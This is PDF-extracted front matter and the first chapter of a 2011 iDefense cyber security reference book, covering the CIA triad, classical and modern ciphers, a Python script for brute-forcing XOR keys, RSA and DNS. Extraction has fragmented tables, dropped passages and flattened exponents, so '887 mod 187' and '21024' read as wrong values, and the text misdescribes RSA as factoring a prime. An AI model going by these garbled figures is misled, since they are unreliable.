Edited by
James Graham
Richard Howard
Ryan Olson
[Word Count: 8]

Auerbach Publications
Taylor & Francis Group
6000 Broken Sound Parkway NW, Suite 300
Boca Raton, FL 33487-2742
[Word Count: 17]

© 2011 by Taylor and Francis Group, LLC
Auerbach Publications is an imprint of Taylor & Francis Group, an Informa business
[Word Count: 21]

No claim to original U.S. Government works
[Word Count: 7]

Printed in the United States of America on acid-free paper
10 9 8 7 6 5 4 3 2 1
[Word Count: 20]

International Standard Book Number-13: 978-1-4398-5126-5 (Ebook-PDF)
[Word Count: 6]

This book contains information obtained from authentic and highly regarded sources. Reasonable 
efforts have been made to publish reliable data and information, but the author and publisher cannot 
assume responsibility for the validity of all materials or the consequences of their use. The authors and 
publishers have attempted to trace the copyright holders of all material reproduced in this publication 
and apologize to copyright holders if permission to publish in this form has not been obtained. If any 
copyright material has not been acknowledged please write and let us know so we may rectify in any 
future reprint.
[Word Count: 98]

Except as permitted under U.S. Copyright Law, no part of this book may be reprinted, reproduced, 
transmitted, or utilized in any form by any electronic, mechanical, or other means, now known or 
hereafter invented, including photocopying, microfilming, and recording, or in any information stor-
age or retrieval system, without written permission from the publishers.
[Word Count: 54]

For permission to photocopy or use material electronically from this work, please access www.copy-
right.com (http://www.copyright.com/) or contact the Copyright Clearance Center, Inc. (CCC), 222 
Rosewood Drive, Danvers, MA 01923, 978-750-8400. CCC is a not-for-profit organization that pro-
vides licenses and registration for a variety of users. For organizations that have been granted a pho-
tocopy license by the CCC, a separate system of payment has been arranged.
[Word Count: 68]

Trademark Notice: Product or corporate names may be trademarks or registered trademarks, and are 
used only for identification and explanation without intent to infringe.
[Word Count: 24]

Visit the Taylor & Francis Web site at
http://www.taylorandfrancis.com
[Word Count: 9]

and the Auerbach Web site at
http://www.auerbach-publications.com
[Word Count: 7]

Chap ter 2	
At tacker Techniques and Motivations	
75
2.1	
How Hackers Cover Their Tracks (Antiforensics)	
75
2.1.1	
How and Why Attackers Use Proxies	
75
[Word Count: 25]

Chap ter 3	
E xploitation	
119
3.1	
Techniques to Gain a Foothold	
119
3.1.1	
Shellcode	
119
3.1.2	
Integer Overflow Vulnerabilities	
124
3.1.3	
Stack-Based Buffer Overflows	
128
3.1.3.1	
Stacks upon Stacks	
128
3.1.3.2	
Crossing the Line	
130
3.1.3.3	
Protecting against Stack-Based 
Buffer Overflows	
132
3.1.3.4	
Addendum: Stack-Based Buffer 
Overflow Mitigation	
132
3.1.4	
Format String Vulnerabilities	
133
3.1.5	
SQL Injection	
138
3.1.5.1	
Protecting against SQL Injection	
140
3.1.5.2	
Conclusion	
141
3.1.6	
Malicious PDF Files	
142
3.1.6.1	
PDF File Format	
143
[Word Count: 78]

Chap ter 4	
Malicious C ode	
195
4.1	
Self-Replicating Malicious Code	
195
4.1.1	
Worms	
195
4.1.2	
Viruses	
198
4.2	
Evading Detection and Elevating Privileges	
203
4.2.1	
Obfuscation	
203
4.2.2	
Virtual Machine Obfuscation	
208
4.2.3	
Persistent Software Techniques	
213
4.2.3.1	
Basic Input–Output System 
(BIOS)/Complementary Metal-
Oxide Semiconductor (CMOS) 
and Master Boot Record (MBR) 
Malicious Code	
213
4.2.3.2	
Hypervisors	
214
4.2.3.3	
Legacy Text Files	
214
4.2.3.4	
Autostart Registry Entries	
215
4.2.3.5	
Start Menu “Startup” Folder	
217
4.2.3.6	
Detecting Autostart Entries	
217
[Word Count: 79]

Chap ter 5	
D efense and A nalysis Techniques	
267
5.1	
Memory Forensics	
267
5.1.1	
Why Memory Forensics Is Important	
267
5.1.2	
Capabilities of Memory Forensics	
268
5.1.3	
Memory Analysis Frameworks	
268
5.1.4	
Dumping Physical Memory	
270
5.1.5	
Installing and Using Volatility	
270
5.1.6	
Finding Hidden Processes	
272
5.1.7	
Volatility Analyst Pack	
275
5.1.8	
Conclusion	
275
[Word Count: 56]

5.2	
Honeypots	
275
5.3	
Malicious Code Naming	
281
5.3.1	
Concluding Comments	
285
5.4	
Automated Malicious Code Analysis Systems	
286
5.4.1	
Passive Analysis	
287
5.4.2	
Active Analysis	
290
5.4.3	
Physical or Virtual Machines	
291
5.5	
Intrusion Detection Systems	
294
References	
301
[Word Count: 40]

Chap ter 6	
iDefense Special File Investig ation Tools	
305
[Word Count: 10]

xi
© 2011 by Taylor & Francis Group, LLC
[Word Count: 9]

This is not your typical security book. Other books of this genre exist to 
prepare you for certification or to teach you how to use a tool, but none 
explains the concepts behind the security threats impacting enterprises 
every day in a manner and format conducive to quick understanding.
[Word Count: 49]

It is similar to a reference book, an encyclopedia of sorts, but not 
quite. It is not comprehensive enough to be an encyclopedia. This 
book does not cover every security concept from A to Z, just the ones 
that we have observed having the most impact on the large-enterprise 
network battle.
[Word Count: 51]

It is similar to the Physician’s Desktop Reference (PDR), but once 
again not quite. The PDR is an annually published aggregation of 
drug manufacturers’ prescription information. The information in
[Word Count: 29]

this book does not change often enough to require an annual update. 
Most of the material covers baseline concepts with which all security 
practitioners should be familiar and may serve as the first step toward 
developing a prescription to solve security problems they are likely to 
see daily.
[Word Count: 48]

It is similar to military “smart books,” but, ultimately, not quite. 
Smart books are built by the soldiers themselves when they are placed 
in charge of a new mission. These are generally looseleaf notebooks 
that carry snippets of key information about how to get the job 
done—everything from stats about a unit’s combat reaction drills to 
information about the entire unit’s weapons capabilities. They contain 
checklists and how-to’s and FAQs and any other critical information 
that a soldier cannot afford to forget. In summary, we took the liberty 
of building a cyber security smart book for you.
[Word Count: 97]

This book builds on the methods that all these types of books use. 
The contents are inspired by the cyber security experts around the 
world who are continuously learning new concepts or who have to 
explain old concepts to bosses, peers, and subordinates. What they 
need is a desktop reference, a place to start to refresh their knowledge 
on old subjects they are already familiar with or to come up to speed 
quickly on something new they know nothing about.
[Word Count: 80]

We do not want you to read this from cover to cover. Go to the table 
of contents, pick a topic you are interested in, and understand it. Jump 
around; read what interests you most, but keep it handy for emergen-
cies—on your desk, on your bookshelf, or even in your e-book reader. 
By the time you are done with all the issues explained throughout this 
book, you will be the “go-to” person in your security organization. 
When you need a refresher or you need to learn something new, start 
here. That’s what we intend it to do for you.
[Word Count: 100]

xiii
© 2011 by Taylor & Francis Group, LLC
[Word Count: 9]

This book is the direct result of the outstanding efforts of a talented 
pool of security analysts, editors, business leaders, and security profes­
sionals, all of whom work for iDefense® Security Intelligence Services; 
a business unit of VeriSign, Inc.
[Word Count: 39]

iDefense is an open-source, cyber security intelligence operation 
that maintains expertise in vulnerability research and alerting, exploit 
development, malicious code analysis, underground monitoring, and 
international actor attribution. iDefense provides intelligence prod­
ucts to Fortune 1,000 companies and “three-letter agencies” in various 
world governments. iDefense also maintains the Security Operations 
Center for the Financial Sector Information Sharing and Analysis 
Center (FS-ISAC), one of 17 ISACs mandated by the US govern­
ment to facilitate information sharing throughout the country’s busi­
ness sectors.
[Word Count: 80]

iDefense has the industry-unique capability of determining not only 
the technical details of cyber security threats and events (the “what,” 
the “when,” and the “where”), but because of their international pres-
ence, iDefense personnel can ascertain the most likely actors and moti-
vations behind these attacks (the “who” and the “why”).
[Word Count: 51]

For more information, please contact customerservice@idefense.com.
[Word Count: 6]

xv
© 2011 by Taylor & Francis Group, LLC
[Word Count: 9]

Jason Greenwood
Rick Howard
Steven Winterfield
Ralph Thomas
[Word Count: 8]

Michael Ligh
Greg Sinclair
Blake Hartstein
Shahan Sudusinghe
Jon Gary
Robert Falcone
Aldrich De Mata
Ryan Smith
Arion Lawrence
[Word Count: 19]

Bryan Richardson
Kellie Bryan
Pam Metrokotsas
Meredith Rothrock
Taryn Sneed
[Word Count: 10]

1.1.1  Information Assurance Fundamentals
[Word Count: 4]

Authentication, authorization, and nonrepudiation are tools that 
system designers can use to maintain system security with respect 
to confidentiality, integrity, and availability. Understanding each of 
these six concepts and how they relate to one another helps security 
professionals design and implement secure systems. Each component 
is critical to overall security, with the failure of any one component 
resulting in potential system compromise.
[Word Count: 62]

1.1.1.1  Authentication  Authentication is important to any secure sys-
tem, as it is the key to verifying the source of a message or that an 
individual is whom he or she claims. The NIAG defines authentication 
as a “security measure designed to establish the validity of a transmis-
sion, message, or originator, or a means of verifying an individual’s 
authorization to receive specific categories of information.”
[Word Count: 66]

There are many methods available to authenticate a person. In each 
method, the authenticator issues a challenge that a person must answer. 
This challenge normally comprises requesting a piece of information 
that only authentic users can supply. These pieces of information nor­
mally fall into the three classifications known as factors of authentica­
tion (see Exhibit 1-1).
[Word Count: 57]

When an authentication system requires more than one of these fac­
tors, the security community classifies it as a system requiring multifac­
tor authentication. Two instances of the same factor, such as a password 
combined with a user’s mother’s maiden name, are not multifactor 
authentication, but combining a fingerprint scan and a personal iden­
tification number (PIN) is, as it validates something the user is (the 
owner of that fingerprint) and something the user knows (a PIN).
[Word Count: 77]

Authentication also applies to validating the source of a message, 
such as a network packet or e-mail. At a low level, message authen­
tication systems cannot rely on the same factors that apply to human 
authentication. Message authentication systems often rely on crypto­
graphic signatures, which consist of a digest or hash of the message 
generated with a secret key. Since only one person has access to the 
key that generates the signature, the recipient is able to validate the 
sender of a message.
[Word Count: 84]

Without a sound authentication system, it is impossible to trust 
that a user is who he or she says that he or she is, or that a message is 
from who it claims to be.
[Word Count: 35]

1.1.1.2  Authorization  While authentication relates to verifying iden-
tities, authorization focuses on determining what a user has permission
[Word Count: 18]

Information the system assumes others do not know; this information may be 
secret, like a password or PIN code, or simply a piece of information that most 
people do not know, such as a user’s mother’s maiden name.
[Word Count: 38]

Something the user possesses that only he or she holds; a Radio Frequency ID 
(RFID) badge, One-Time-Password (OTP) generating Token, or a physical key
[Word Count: 24]

A person’s fingerprint, voice print, or retinal scan—factors known as biometrics
[Word Count: 11]

to do. The NIAG defines authorization as “access privileges granted to 
a user, program, or process.”
[Word Count: 16]

After a secure system authenticates users, it must also decide what 
privileges they have. For instance, an online banking application will 
authenticate a user based on his or her credentials, but it must then 
determine the accounts to which that user has access. Additionally, 
the system determines what actions the user can take regarding those 
accounts, such as viewing balances and making transfers.
[Word Count: 63]

1.1.1.4  Confidentiality  The term confidentiality is familiar to most 
people, even those not in the security industry. The NIAG defines
[Word Count: 20]

confidentiality as “assurance that information is not disclosed to unau­
thorized individuals, processes, or devices.”
[Word Count: 15]

Confidentiality of digital information also requires controls in the 
real world. Shoulder surfing, the practice of looking over a person’s 
shoulder while at his or her computer screen, is a nontechnical way 
for an attacker to gather confidential information. Physical threats, 
such as simple theft, also threaten confidentiality. The consequences 
of a breach of confidentiality vary depending on the sensitivity of the 
protected data. A breach in credit card numbers, as in the case of the 
Heartland Payment Systems processing system in 2008, could result 
in lawsuits with payouts well into the millions of dollars.
[Word Count: 95]

1.1.1.5  Integrity  In the information security realm, integrity normally 
refers to data integrity, or ensuring that stored data are accurate and 
contain no unauthorized modifications. The National Information 
Assurance Glossary (NIAG) defines integrity as follows:
[Word Count: 35]

Quality of an IS (Information System) reflecting the logical correctness 
and reliability of the operating system; the logical completeness of the 
hardware and software implementing the protection mechanisms; and 
the consistency of the data structures and occurrence of the stored data. 
Note that, in a formal security mode, integrity is interpreted more nar­
rowly to mean protection against unauthorized modification or destruc­
tion of information.3
[Word Count: 65]

This principal, which relies on authentication, authorization, and 
nonrepudiation as the keys to maintaining integrity, is preventing 
those without authorization from modifying data. By bypassing an 
authentication system or escalating privileges beyond those normally 
granted to them, an attacker can threaten the integrity of data.
[Word Count: 45]

Software flaws and vulnerabilities can lead to accidental losses 
in data integrity and can open a system to unauthorized modifica­
tion. Programs typically tightly control when a user has read-to-write 
access to particular data, but a software vulnerability might make 
it possible to circumvent that control. For example, an attacker can 
exploit a Structured Query Language (SQL) injection vulnerability 
to extract, alter, or add information to a database.
[Word Count: 68]

Disrupting the integrity of data at rest or in a message in transit 
can have serious consequences. If it were possible to modify a funds 
transfer message passing between a user and his or her online banking 
website, an attacker could use that privilege to his or her advantage. 
The attacker could hijack the transfer and steal the transferred funds 
by altering the account number of the recipient of the funds listed in 
the message to the attacker’s own bank account number. Ensuring the 
integrity of this type of message is vital to any secure system.
[Word Count: 96]

1.1.1.6  Availability  Information systems must be accessible to users 
for these systems to provide any value. If a system is down or respond-
ing too slowly, it cannot provide the service it should. The NIAG 
defines availability as “timely, reliable access to data and information 
services for authorized users.”
[Word Count: 49]

Attacks on availability are somewhat different from those on integ-
rity and confidentiality. The best-known attack on availability is a 
denial of service (DoS) attack. A DoS can come in many forms, but 
each form disrupts a system in a way that prevents legitimate users
[Word Count: 45]

from accessing it. One form of DoS is resource exhaustion, whereby 
an attacker overloads a system to the point that it no longer responds 
to legitimate requests. The resources in question may be memory, 
central processing unit (CPU) time, network bandwidth, and/or any 
other component that an attacker can influence. One example of a 
DoS attack is network flooding, during which the attacker sends so 
much network traffic to the targeted system that the traffic saturates 
the network and no legitimate request can get through.
[Word Count: 85]

Understanding the components of the CIA triad and the concepts 
behind how to protect these principals is important for every security 
professional. Each component acts like a pillar that holds up the secu­
rity of a system. If an attacker breaches any of the pillars, the security 
of the system will fall. Authentication, authorization, and nonrepu­
diation are tools that system designers can use to maintain these pil­
lars. Understanding how all of these concepts interact with each other 
is necessary to use them effectively.
[Word Count: 85]

This section provides information on basic cryptography to explain 
the history and basics of ciphers and cryptanalysis. Later sections will 
explain modern cryptography applied to digital systems.
[Word Count: 27]

The English word cryptography derives from Greek and translates 
roughly to “hidden writing.” For thousands of years, groups who wanted 
to communicate in secret developed methods to write their messages 
in a way that only the intended recipient could read. In the information 
age, almost all communication is subject to some sort of eavesdropping, 
and as a result cryptography has advanced rapidly. Understanding how 
cryptography works is important for anyone who wants to be sure that 
their data and communications are safe from intruders. This section 
discusses cryptography, starting with basic ciphers and cryptanalysis.
[Word Count: 94]

The ancient Egyptians began the first known practice of writ-
ing secret messages, using nonstandard hieroglyphs to convey secret 
messages as early as 1900 bc. Since that time, people have developed 
many methods of hiding the content of a message. These methods are 
known as ciphers.
[Word Count: 46]

The most famous classical cipher is the substitution cipher. 
Substitution ciphers work by substituting each letter in the alphabet
[Word Count: 19]

with another one when writing a message. For instance, one could 
shift the letters of the English alphabet as shown:
[Word Count: 20]

abcdefghijklmnopqrstuvwxyz
nopqrstuvwxyzabcdefghijklm
[Word Count: 2]

Using this cipher, the message “the act starts at midnight” would be 
written as “gur npg fgnegf ng zvqavtug.” The text above, showing how 
to decode the message, is known as the key. This is a very simple sub­
stitution cipher known as the Caesar cipher (after Julius Caesar, who 
used it for military communications) or ROT13 because the charac­
ters in the key are rotated thirteen spaces to the left.
[Word Count: 71]

Next, the analyst might notice that the fourth word is only two letters 
long and ends with t. There are two likely possibilities for this word: at 
and it. He chooses at and replaces all occurrences of n in the sentence 
with an a.
[Word Count: 44]

With at in place, the pattern is clearer, and the analyst guesses that if 
the letter g translates to t, the adjacent letter f may translate to s.
[Word Count: 28]

The word sta_ts now looks very close to starts, and the analyst makes 
another substitution, indicating that rst is equivalent to efg, which 
reveals the full pattern of the cipher and the message. While the 
message is now clear, the meaning of “the act starts at midnight” is 
not. Code words are an excellent way of hiding a message but, unlike
[Word Count: 61]

cryptography, cannot hide the meaning of arbitrary information with­
out agreement on the meaning of the code words in advance.
[Word Count: 20]

Short messages can be difficult to decrypt because there is little for 
the analyst to study, but long messages encrypted with substitution 
ciphers are vulnerable to frequency analysis. For instance, in the English 
language, some letters appear in more words than others do. Exhibit 
1-2 shows the frequency of each letter in the English language.
[Word Count: 55]

E is by far the most common letter in the English language and, as 
such, is also the most likely character in an article written in English. 
Using the table above, an analyst could determine the most likely 
cleartext of any ciphertext encrypted with a substitution cipher. As 
shown in the example sentence above, while the ciphertext appears to 
be random, patterns remain that betray the original text.
[Word Count: 68]

The ultimate goal of any cipher is to produce ciphertext that is 
indistinguishable from random data. Removing the patterns inherent 
in the original text is crucial to producing ciphertext that is impos-
sible to decode without the original key. In 1917, Gilbert Vernam
[Word Count: 43]

Exhibit 1-2  Frequency of letters in the English language.
[Word Count: 9]

developed the one-time pad, a cryptographic cipher that, with a prop­
erly randomized key, produces unbreakable ciphertext. A one-time 
pad is similar to a substitution cipher, for which another letter based 
on a key replaces a letter, but rather than using the same key for the 
entire message, a new key is used for each letter. This key must be at 
least as long as the message and not contain any patterns a cryptana­
lyst could use to break the code.
[Word Count: 81]

Clear
T
h
e
a
c
T
s
t
a
r
t
s
a
t
m
i
d
n
i
g
h
t
[Word Count: 23]

Cage 22 19
2
11
5
12 19
5
16 12
6
11
5
2
19 15 24 20 18
2
21
6
5
19 17
21
[Word Count: 27]

Cipher
O
g
k
f
o
L
e
h
e
g
b
y
u
s
p
q
t
d
k
y
t
n
z
y
n
[Word Count: 26]

The letter a at the beginning of act is rotated five spaces to the 
right, resulting in the letter f; however, the letter a at the beginning
[Word Count: 27]

Exhibit 1-3  A lottery cage randomizes the number selection.
[Word Count: 9]

The problem with one-time pads is that they are cumbersome to 
generate and have a limited length. If a submarine captain goes to 
sea for six months, he must have enough one-time pads with him to 
encode every message he intends to send to central command. This 
dilemma led to the development of machines that could mimic the 
properties of a one-time pad but without the need to generate long 
keys and carry books of random numbers. The most famous machine
[Word Count: 81]

Exhibit 1-4  The German Enigma coding machine.
[Word Count: 7]

of this type is the Enigma, invented by the German engineer Arthur 
Scherbius at the end of World War I.4 The Enigma (see Exhibit 1-4)5 
used a series of rotors (see Exhibit 1-5)6 to encrypt each letter typed 
into it with a different key. Another user with an enigma machine 
could decode the message because their system had the same combi­
nation of encoded rotors.
[Word Count: 65]

Although symmetric encryption requires a shared key and therefore 
depends upon the secrecy of that key, it is an effective and fast method
[Word Count: 23]

for protecting the confidentiality of the encrypted content. In this sec­
tion we explain the basics of symmetric encryption and how it differs 
from asymmetric algorithms. Symmetric encryption is a class of revers­
ible encryption algorithms that use the same key for both encrypting 
and decrypting messages.
[Word Count: 47]

Symmetric encryption, by definition, requires both communica­
tion endpoints to know the same key in order to send and receive 
encrypted messages (see Exhibit 1-6). Symmetric encryption depends 
upon the secrecy of a key. Key exchanges or pre-shared keys present a 
challenge to keeping the encrypted text’s confidentiality and are usu­
ally performed out of band using different protocols.
[Word Count: 59]

Algorithms in this category are usually fast because their opera­
tions use cryptographic primitives. As previously discussed in Basic 
Cryptography we explained how the cryptographic primitive sub­
stitution works. Permutation, or altering the order, is another cryp­
tographic primitive that many symmetric algorithms also use in 
practice.7
[Word Count: 47]

1.1.3.1  Example of Simple Symmetric Encryption with Exclusive OR
[Word Count: 9]

(XOR)  At its most basic level, symmetric encryption is similar to an 
exclusive OR (XOR) operation, which has the following truth table 
for input variables p and q:
[Word Count: 28]

True
True
False
True
False
True
False
True
True
False
False
False
[Word Count: 12]

Exhibit 1-6  Symmetric encryption: the sender and receiver use the same key.
[Word Count: 12]

The XOR operation is nearly the same as one would expect for OR, 
except when both p and q are true. The properties of XOR make it 
ideal for use in symmetric cryptography because one of the inputs (p) 
can act as the message and the other input (q) can act as the key. The 
recipient of an encrypted message (p XOR q) decrypts that message by 
performing the same XOR operation that the sender used to encrypt 
the original message (p).
[Word Count: 82]

False
True
True
True
False
True
True
True
False
False
False
False
[Word Count: 12]

The operation above shows how to decrypt the encrypted message (p 
XOR q) to obtain the original message (p). Applying this technique to 
larger values by using their individual bits and agreeing on a common 
key (q) represents the most basic symmetric encryption algorithm.
[Word Count: 44]

Encryption using XOR is surprisingly common in unsophisticated 
malicious code, including shellcode, even as a means to hide logging 
or configuration information. Due to its simplicity, many unsophisti­
cated attackers use either one-byte XOR keys or multibyte XOR keys 
to hide data. The Python script below demonstrates how to brute force 
single-byte XOR keys when they contain one of the expected strings: 
.com, http, or pass.
[Word Count: 66]

count = len(data)
for key in range(1,255):
 out = ‘‘
 for x in range(0,count):
 out += chr(ord(data[x]) ^ int(key))
 results = out.count(‘.com’) + out.count(‘http’) + 
out.count(‘pass’)
 if results:
print “Encryption key: \t%d matched: %d” % (key,results)
print out
[Word Count: 38]

While this script is effective when the original message contains a 
URL or password string, analysts could use other techniques to iden-
tify expected results such as character distribution or words in the 
English language.
[Word Count: 35]

The reason it is possible to brute force an XOR key that uses just 
one byte is that the length of the key is so small. One byte (8 bits) 
allows for only 256 possible key combinations. A two-byte (16 bits) 
key creates 65,536 possible keys, but this number is still quite easy to 
brute force with modern computing power. Modern cryptographic 
ciphers typically use 128-bit keys, which are still infeasible to brute 
force with today’s computing power.
[Word Count: 78]

1.1.3.2  Improving upon Stream Ciphers with Block Ciphers  Block ciphers 
are more common in symmetric encryption algorithms because they 
operate on a block of data rather than each character (bit or byte). 
PRNG algorithms used in stream ciphers are typically time intensive. 
Block ciphers are the best choice for bulk data encryption. Stream 
ciphers remove patterns from ciphertext using PRNGs, but block 
ciphers use a more efficient method called cipher block chaining (CBC).
[Word Count: 73]

When using a block cipher in CBC mode, both a key and a random 
initialization vector (IV) convert blocks of plaintext into ciphertext. 
The initialization vector and plaintext go through an XOR operation, 
and the result is an input to the block cipher with the chosen key (see 
Exhibit 1-7). This ensures that the resulting ciphertext is different, 
even if the same key was used to encrypt the same plaintext, as long 
as the IV is different and sufficiently random with each execution of 
the algorithm.
[Word Count: 86]

The next block will be encrypted with the same key, but instead of 
using the original IV, CBC mode uses the ciphertext generated by the 
last function as the new IV. In this way, each block of cipher text is 
chained to the last one. This mode has the drawback of data corrup­
tion at the beginning of the file, resulting in complete corruption of 
the entire file, but is effective against cryptanalysis.
[Word Count: 73]

All of the most popular symmetric algorithms use block ciphers 
with a combination of substitution and permutation. These include 
the following:
[Word Count: 21]

•	 1977 DES
•	 1991 IDEA
•	 1993 Blowfish
•	 1994 RC5
•	 1998 Triple DES
•	 1998 AES
[Word Count: 19]

iDefense analyzed several malicious code attacks that encrypt data 
using the popular algorithms shown in this list. Due to attackers 
including the decryption or encryption key on an infected system, 
analysts can attempt to decrypt messages of this type. Additionally, 
analysis of the system memory before encryption or after decryption 
may be effective at revealing the original message.
[Word Count: 58]

Programmers may wish to write custom encryption algorithms, in 
the hopes that their infrequent or unusual use will detract attackers; 
however, such algorithms are usually risky. As an example of this, 
consider how a programmer who applies the data encryption standard 
(DES) algorithm twice could affect the strength of the message. Using 
double DES does not dramatically increase the strength of a message
[Word Count: 63]

Key
Key
Block Cipher
Encryption
Block Cipher
Encryption
[Word Count: 8]

Exhibit 1-7  Cipher block chaining (CBC) mode encryption. Source: Cipher block chaining http://
en.wikipedia.org/wiki/File:Cbc_encryption.png.
[Word Count: 14]

over DES. The reason is that an attacker can compare the decryption 
of the ciphertext and the encryption of the plaintext. When both of 
these values match, the attacker has successfully identified both keys 
used for encrypting the message.
[Word Count: 39]

Symmetric encryption can be very fast and protect sensitive infor­
mation provided the key remains secret. The grouping of larger blocks 
of data in the encryption algorithm makes it more difficult to decrypt 
without the key. Key exchange and protection are the most important 
aspects of symmetric cryptography because anyone who has the key 
can both encrypt and decrypt messages. Asymmetric algorithms are 
different because they use different keys for encryption and decryp­
tion, and in this way, public key encryption can solve other goals 
beyond symmetric algorithms that protect confidentiality.
[Word Count: 91]

This section continues this series with a brief discussion of asymmet­
ric encryption, more commonly referred to as public key encryption.
[Word Count: 21]

Public key encryption represents a branch of cryptography for 
which the distinguishing attribute of the system is the use of two 
linked keys for encryption and decryption, rather than a single key. 
While a variety of public key encryption solutions have been pro­
posed, with some implemented and standardized, each system shares 
one common attribute: each public key system uses one key, known as 
the public key, to encrypt data, and a second key, known as the private 
key, to decrypt the encrypted data.
[Word Count: 84]

private key. The private key has a mathematical relationship to the 
public key, but this relationship does not provide an easy way for an 
attacker to derive the private key from the public key. Given the fact 
that the recipient uses the private key to decrypt messages encoded 
with the public key, it is paramount that the owner of the private key 
keeps it secure at all times.
[Word Count: 68]

Visually, the process of encrypting and decrypting a message using 
the public key method is similar to the process of using symmetric 
encryption with the notable exception that the keys used in the pro­
cess are not the same. Exhibit 1-8 illustrates this disconnect.
[Word Count: 44]

12359843212465
76865432135498
78435432157695
[Word Count: 3]

Receiver’s
Private Key
Receiver’s
Public Key
[Word Count: 6]

Exhibit 1-8  Symmetric encryption (top) versus public key encryption (bottom).
[Word Count: 10]

1.	The recipient generates three numbers: one to be used as an
[Word Count: 12]

exponential (e), one as a modulus (n), and one as the multipli­
cative inverse of the exponential with respect to the modulus 
(d). The modulus n should be the product of two very large 
prime numbers, p and q. Thusly, n = pq.
	
2.	The recipient publishes his or her public key as (e, n).
	
3.	The sender transforms the message (M) to be encrypted into
[Word Count: 66]

an integer whose value is between 0 and (n−1). If the message 
cannot fit within the confines of this integer space, the mes-
sage is broken into multiple blocks.
	
4.	The sender generates the ciphertext (C) by applying the fol-
[Word Count: 40]

5.	The sender transmits the ciphertext to the recipient.
	
6.	The recipient uses the pair (d, n) as the private key in order
[Word Count: 23]

to decrypt the ciphertext. The decryption process uses the 
following mathematical transform to recover the original 
plaintext:
[Word Count: 17]

The power of the RSA scheme lays in the use of the large prime 
numbers p and q. Factoring an extremely large prime number (on the 
order of 21024 or 309 digits) is an exceedingly difficult task—a task for 
which there is no easy solution. To understand how the RSA scheme 
works in simpler terms, it is best to use a simpler, smaller example:10
[Word Count: 64]

1.	The recipient chooses two prime numbers: for example, p = 17
[Word Count: 12]

and q = 11.
	
2.	The recipient calculates n by multiplying the two prime num­
[Word Count: 15]

bers together: (n = 187).
	
3.	The recipient chooses an exponent such that the exponent is
[Word Count: 16]

less than (p−1)(q−1), which is 160, and the exponent is rela­
tively prime to this number. In this scenario, a recipient could 
choose the number 7, as it is less than 160 and relatively prime 
to 160.
	
4.	The value of d is calculated by solving de = 1 (mod 160) with
[Word Count: 52]

d < 160. The math behind this calculation is beyond the scope 
of this book; however, in this scenario, d has the value of 23.
	
5.	At this point in the scenario, the recipient could have devel­
[Word Count: 37]

oped a private key of (23, 187) and a public key of (7, 187).
[Word Count: 14]

If the sender were to encrypt the message of 88 (which is between 
0 and 186) using the RSA method, the sender would calculate 887 
mod 187, which equals 11. Therefore, the sender would transmit the 
number 11 as the ciphertext to the recipient. To recover the original 
message, the recipient would then need to transform 11 into the origi-
nal value by calculating 1123 mod 187, which equals 88. Exhibit 1-9 
depicts this process.
[Word Count: 75]

As seen in the previous example, public key encryption is a com-
putationally expensive process. As such, public key encryption is not
[Word Count: 22]

suited for bulk data encryption. The computational overhead resulting 
from public key encryption schemes is prohibitive for such an appli­
cation. Smaller messages and symmetric encryption key exchanges 
are ideal applications for public key encryption. For example, secure 
socket layer (SSL) communication uses public key encryption to 
establish the session keys to use for the bulk of the SSL traffic. The 
use of public key encryption to communicate the key used in a sym­
metric encryption system allows two parties communicating over an 
untrusted medium to establish a secure session without undue pro­
cessing requirements.
[Word Count: 95]

Compared to the old symmetric encryption, public key encryp­
tion is a new technology revolutionizing the field of cryptography. 
The encryption scheme allows parties to communicate over hostile 
communication channels with little risk of untrusted parties revealing 
the contents of their communication. The use of two keys—one public 
and one private—reduces the burden of establishing a shared secret 
prior to the initial communication. While the mathematics involved 
in public key encryption is complex, the result is an encryption system 
that is well suited for untrusted communication channels.
[Word Count: 87]

This section explains the fundamentals of the domain name sys-
tem (DNS), which is an often overlooked component of the Web’s 
infrastructure, yet is crucial for nearly every networked application. 
Many attacks, such as fast-flux and DNS application, take advan-
tage of weaknesses in the DNS design that emphasize efficiency over
[Word Count: 51]

Private Key (23, 187)
Public Key (7, 187)
[Word Count: 8]

Decryption
1123 mod 187 = 88
Ciphertext “11”
[Word Count: 8]

Exhibit 1-9  An RSA encryption–decryption example. Note: RSA stands for Ron Rivest, Adi Shamir, 
and Leonard Adleman, its inventors.
[Word Count: 19]

security. Later sections will discuss some attacks that abuse the DNS 
and will build upon the base information provided in this section.
[Word Count: 22]

DNS is a fundamental piece of the Internet architecture. Knowledge 
of how the DNS works is necessary to understand how attacks on the 
system can affect the Internet as a whole and how criminal infrastruc­
ture can take advantage of it.
[Word Count: 41]

The Internet Protocol is the core protocol the Internet uses. Each 
computer with Internet access has an assigned IP address so that other 
systems can send traffic to it. Each IP address consists of four num­
bers between 0 and 255 separated by periods, such as 74.125.45.100. 
These numbers are perfect for computers that always deal with bits 
and bytes but are not easy for humans to remember. To solve this 
problem, the DNS was invented in 1983 to create easy-to-remember 
names that map to IP address.
[Word Count: 87]

Exhibit 1-10  The hierarchical structure of the domain name system (DNS).
[Word Count: 11]

the hierarchical nature of the DNS leads to a tree-like structure con­
sisting of domains and subdomains.
[Word Count: 17]

Separating domains in this way allows different registries to man­
age the different TLDs. These registries are responsible for keeping 
the records for their assigned TLD and making infrastructure avail­
able to the Internet so users can map each domain name to its cor­
responding IP address.
[Word Count: 47]

The DNS uses computers known as name servers to map domain 
names to the corresponding IP addresses using a database of records. 
Rather than store information for every domain name in the system, 
each DNS server must only store the information for its domain. For 
instance, the name server gotgoogle.com keeps information for www.
google.com and mail.google.com but not for www.yahoo.com. Name 
servers are granted authority over a domain by the domain above 
them, in this case .com. When a name server has this authority, it 
aptly receives the title of authoritative name server for that domain.
[Word Count: 97]

of the root server and the .com server are usually cached due to the 
frequency with which systems request them.
[Word Count: 20]

;; QUESTION SECTION:
;; NAME	
	
CLASS	 	
TYPE
;www.google.com.	
	
IN	
	
A
;; ANSWER SECTION:
;; NAME	
TTL	
CLASS	 TYPE	
DATA
www.google.com.	
180	
IN	
A	 	
64.233.169.147
[Word Count: 24]

In the question section, the resolver has specified that it wants the 
A record for www.google.com in the Internet class (specified by IN). 
During the development of DNS, additional classes were created, but 
the Internet class is the only one commonly used today. The answer 
session includes the information from the question, the IP address for
[Word Count: 56]

google Second
Level Domain Server
216.239.32.10
[Word Count: 6]

1. What is google.com’s
 IP Address
2. What is .com’s Name Server
 IP Address
3. 192.5.6.30
4. What is google’s Name Server
 IP Address
5. 216.239.32.10
6. What is google’s IP Address?
7. 74.125.45.100
8. 74.125.45.100
DNS Server
8
[Word Count: 39]

Exhibit 1-11  Resolution of google.com using a recursive DNS server.
[Word Count: 10]

